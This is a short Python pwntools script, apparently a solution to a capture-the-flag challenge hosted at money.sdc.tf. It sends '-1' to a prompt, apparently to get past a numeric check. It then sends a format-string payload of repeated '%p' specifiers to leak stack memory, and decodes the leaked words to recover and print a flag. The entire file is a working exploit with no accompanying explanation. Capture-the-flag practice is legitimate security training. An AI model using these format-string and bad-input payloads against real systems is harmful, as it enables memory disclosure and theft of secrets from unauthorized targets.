from pwn import *

r = remote("money.sdc.tf", 1337)

print(r.recvuntil(b'want?\n'))

r.sendline(b"-1")

print(r.recvuntil(b"?\n"))

r.sendline(b"%p "*18)

var = r.recvuntil(b'\n')
r.close()

arr = [x[2:] if len(x) > 3 else x for x in var.split()]

sol = ""

for x in arr:
    if len(x)%2==0:
        localsol = ""
        for i in range(0, len(x), 2):
            localsol += chr(int(x[i:i+2], 16))
        sol+=localsol[::-1]

print(sol[sol.index('sdctf'):])